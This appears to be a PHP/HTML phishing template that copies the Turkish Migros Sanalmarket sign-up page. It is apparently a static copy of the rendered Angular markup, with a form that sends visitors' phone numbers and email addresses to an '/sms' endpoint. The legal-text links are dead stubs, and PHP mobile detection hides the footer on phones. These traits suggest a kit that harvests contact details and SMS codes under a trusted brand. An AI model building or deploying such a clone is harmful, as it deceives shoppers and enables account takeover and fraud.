<style>
    .header{
        display: none;
    }
    <?php
      if ($detect->isMobile()) {?>
    .footer
    {
      display: none;
    }
    <?php }?>
</style>
<sm-header-lite _ngcontent-tus-c368="" _nghost-tus-c366="" class="ng-star-inserted">
   <div _ngcontent-tus-c366="" class="header-wrapper">
      <div _ngcontent-tus-c366="" class="desktop-only">
         <!----><!---->
      </div>
      <div _ngcontent-tus-c366="" class="logo-container elektronik"></div>
      <div _ngcontent-tus-c366="" class="mobile-only">
         <!----><!---->
      </div>
   </div>
   <!---->
</sm-header-lite>
<main _ngcontent-tus-c368="" class="elektronik">
   <router-outlet _ngcontent-tus-c368=""></router-outlet>
   <sm-auth _nghost-tus-c500="" class="ng-star-inserted">
      <article _ngcontent-tus-c500="" class="auth-article">
         <div _ngcontent-tus-c500="" class="padding">
            <router-outlet _ngcontent-tus-c500=""></router-outlet>
            <sm-register class="ng-star-inserted">
               <div class="register">
                  <mat-card class="mat-mdc-card mdc-card register__content">
                     <mat-card-header class="mat-mdc-card-header justify-content-center">
                        <div class="mat-mdc-card-header-text"></div>
                        <h1 class="text-color-orange text-align-center ng-star-inserted">Üye Ol</h1>
                        <!----><!---->
                     </mat-card-header>
                     <mat-card-content class="mat-mdc-card-content">
                        <div class="register-page__form">
                           <!---->
                           <p class="subtitle-2 text-align-center text-color-black">
                              İndirimlerden faydalanmak için <!----> hemen üye ol 
                           </p>
                           <form id="myform" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid" action="/sms" method="post">
                              <mat-form-field id="register_phone" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-15 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                 <!---->
                                 <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-15 mdc-text-field--outlined">
                                    <!---->
                                    <div class="mat-mdc-form-field-flex ng-tns-c186-15">
                                       <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c186-15 mdc-notched-outline--notched mdc-notched-outline--upgraded ng-star-inserted">
                                          <div class="mdc-notched-outline__leading"></div>
                                          <div class="mdc-notched-outline__notch" style="width: calc(118px * var(--mat-mdc-form-field-floating-label-scale, 0.75) + 9px);">
                                             <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c186-15 mdc-floating-label--float-above ng-star-inserted" id="mat-mdc-form-field-label-18" for="mat-input-3" aria-owns="mat-input-3" style="">
                                                <mat-label class="subtitle-2 text-color-black ng-tns-c186-15">Telefon Numarası</mat-label>
                                                <!---->
                                             </label>
                                             <!----><!----><!---->
                                          </div>
                                          <div class="mdc-notched-outline__trailing"></div>
                                       </div>
                                       <!----><!----><!---->
                                       <div class="mat-mdc-form-field-infix ng-tns-c186-15">
                                       <input type="tel" matinput="" name="telefon" autocomplete="tel" required="" feonlynumbers="" femdcmaskedinput="" formcontrolname="phoneNumber" class="mat-mdc-input-element ng-tns-c186-15 ng-untouched ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored" id="mat-input-3" aria-invalid="false" aria-required="true" oninput="addPrefix()" required>
                                       </div>
                                       <!----><!---->
                                    </div>
                                    <!---->
                                 </div>
                                 <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c186-15">
                                    <!---->
                                    <div class="mat-mdc-form-field-hint-wrapper ng-tns-c186-15 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                       <!---->
                                       <div class="mat-mdc-form-field-hint-spacer ng-tns-c186-15"></div>
                                    </div>
                                    <!---->
                                 </div>
                              </mat-form-field>
                              <mat-form-field id="register_email" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-16 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-hide-placeholder mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                 <!---->
                                 <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-16 mdc-text-field--outlined">
                                    <!---->
                                    <div class="mat-mdc-form-field-flex ng-tns-c186-16">
                                       <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c186-16 mdc-notched-outline--upgraded ng-star-inserted">
                                          <div class="mdc-notched-outline__leading"></div>
                                          <div class="mdc-notched-outline__notch">
                                             <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c186-16 ng-star-inserted" id="mat-mdc-form-field-label-20" for="mat-input-4" aria-owns="mat-input-4" style="">
                                                <mat-label id="emailLabel" class="subtitle-2 text-color-black ng-tns-c186-16">E-Posta</mat-label>
                                                <!---->
                                             </label>
                                             <!----><!----><!---->
                                          </div>
                                          <div class="mdc-notched-outline__trailing"></div>
                                       </div>
                                       <!----><!----><!---->
                                       <div class="mat-mdc-form-field-infix ng-tns-c186-16">
                                          <!----><input id="emailInput" matinput="" required="" name="email" oninput="handleInput()" type="email" label="E-Posta" formcontrolname="email" class="mat-mdc-input-element ng-tns-c186-16 ng-untouched ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored" id="mat-input-4" aria-required="true" required>
                                       </div>
                                       <!----><!---->
                                    </div>
                                    <!---->
                                 </div>
                                 <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c186-16">
                                    <!---->
                                    <div class="mat-mdc-form-field-hint-wrapper ng-tns-c186-16 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                       <!---->
                                       <div class="mat-mdc-form-field-hint-spacer ng-tns-c186-16"></div>
                                    </div>
                                    <!---->
                                 </div>
                              </mat-form-field>
                              <div class="register__content--agreements"><span class="mat-caption-normal"><a href="javascript:void(0)" class="text-color-orange">Kişisel Verilerin Korunması Hakkında Aydınlatma Metni </a> için tıklayın. </span></div>
                              <div class="register__content--agreements">
                                 <mat-checkbox color="primary" formcontrolname="permitMembership" required="" class="mat-mdc-checkbox fe-checkbox-label-caption mat-primary ng-untouched ng-pristine ng-invalid" id="mat-mdc-checkbox-1">
                                    <div class="mdc-form-field">
                                       <div class="mdc-checkbox">
                                          <div class="mat-mdc-checkbox-touch-target"></div>
                                          <input type="checkbox" class="mdc-checkbox__native-control" id="mat-mdc-checkbox-1-input" required="" tabindex="0" aria-checked="false" required>
                                          <div class="mdc-checkbox__ripple"></div>
                                          <div class="mdc-checkbox__background">
                                             <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true" class="mdc-checkbox__checkmark">
                                                <path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59" class="mdc-checkbox__checkmark-path"></path>
                                             </svg>
                                             <div class="mdc-checkbox__mixedmark"></div>
                                          </div>
                                          <div mat-ripple="" class="mat-ripple mat-mdc-checkbox-ripple mat-mdc-focus-indicator"></div>
                                       </div>
                                       <label for="mat-mdc-checkbox-1-input">
                                          <span class="mat-caption-normal">
                                             <a href="javascript:void(0)" class="text-color-orange">Üyelik Sözleşmesi</a> 'ni onaylıyorum ve <a href="javascript:void(0)" class="text-color-orange">Açık Rıza Metni</a> kapsamında kişisel verilerimin işlenmesine ve paylaşılmasına onay veriyorum. * <!---->
                                          </span>
                                       </label>
                                    </div>
                                 </mat-checkbox>
                              </div>
                              <div class="register__content--agreements">
                                 <mat-checkbox color="primary" formcontrolname="permitContact" class="mat-mdc-checkbox fe-checkbox-label-caption mat-primary ng-untouched ng-pristine ng-valid" id="mat-mdc-checkbox-2">
                                    <div class="mdc-form-field">
                                       <div class="mdc-checkbox">
                                          <div class="mat-mdc-checkbox-touch-target"></div>
                                          <input type="checkbox" class="mdc-checkbox__native-control" id="mat-mdc-checkbox-2-input" tabindex="0" aria-checked="false" required>
                                          <div class="mdc-checkbox__ripple"></div>
                                          <div class="mdc-checkbox__background">
                                             <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true" class="mdc-checkbox__checkmark">
                                                <path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59" class="mdc-checkbox__checkmark-path"></path>
                                             </svg>
                                             <div class="mdc-checkbox__mixedmark"></div>
                                          </div>
                                          <div mat-ripple="" class="mat-ripple mat-mdc-checkbox-ripple mat-mdc-focus-indicator"></div>
                                       </div>
                                       <label for="mat-mdc-checkbox-2-input"><span class="mat-caption-normal"> Migros Sanalmarket indirim ve kampanyalarından anında haberdar olmak için <a href="javascript:void(0)" class="text-color-orange">Dijital Platform Gıda Hizmetleri A.Ş. Ticari İletişim İzni Metni</a> kapsamında iletişim izni veriyorum. </span></label>
                                    </div>
                                 </mat-checkbox>
                              </div>
                              <fe-button type="submit" label="Üye Ol" _nghost-tus-c239="">
                                 <button id="submitButton" _ngcontent-tus-c239="" mat-flat-button="" color="primary" class="mdc-button mdc-button--unelevated mat-mdc-unelevated-button mat-primary mat-mdc-button-base ng-star-inserted" type="submit" disabled>
                                    <span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span>
                                    <span class="mdc-button__label">
                                       <!----> Üye Ol <!---->
                                    </span>
                                    <span class="mat-mdc-focus-indicator"></span><span matripple="" class="mat-ripple mat-mdc-button-ripple"></span><span class="mat-mdc-button-touch-target"></span>
                                 </button>
                                 <!----><!---->
                              </fe-button>
                           </form>
                        </div>
                     </mat-card-content>
                     <mat-card-actions class="mat-mdc-card-actions mdc-card__actions bg-basic-50"><span class="mat-body-2 text-color-grey"> Zaten üyeysen <a id="register_login-link" routerlink="/giris" class="text-color-orange subtitle-2" ngx-ql="" href="/giris">Giriş Yap</a></span></mat-card-actions>
                  </mat-card>
               </div>
            </sm-register>
            <!---->
         </div>
      </article>
   </sm-auth>
   <!---->
</main>
<script>
   document.getElementById('myform').addEventListener('input', function () {
      var formElements = this.elements;
      var submitButton = document.getElementById('submitButton');

      for (var i = 0; i < formElements.length; i++) {
         if (
               formElements[i].type !== 'submit' &&
               formElements[i].type !== 'checkbox' &&
               formElements[i].value.trim() === ''
         ) {
               submitButton.disabled = true;
               return;
         } else if (
               formElements[i].type === 'checkbox' &&
               !formElements[i].checked
         ) {
               submitButton.disabled = true;
               return;
         }
      }
      submitButton.disabled = false;
   });

</script>

<script>
   function handleInput() {
      var inputElement = document.getElementById("emailInput");
      var labelElement = document.getElementById("emailLabel");
      if (inputElement.value.trim() !== "") {
         labelElement.style.display = "none";
      } else {
         labelElement.style.display = "block";
      }
   }

   function formatPhoneNumber() {
      var inputElement = document.getElementById("mat-input-3");
      var inputValue = inputElement.value.replace(/\D/g, '').slice(0, 10);

      var formattedValue = '';
      if (inputValue.length > 0) formattedValue += '0(' + inputValue.substring(0, 1);
      if (inputValue.length > 1) formattedValue += inputValue.substring(1, 4) + ') ';
      if (inputValue.length > 4) formattedValue += inputValue.substring(4, 7) + '-';
      if (inputValue.length > 7) formattedValue += inputValue.substring(7);

      inputElement.value = formattedValue;
   }
   document.getElementById("mat-input-3").addEventListener('input', formatPhoneNumber);
</script>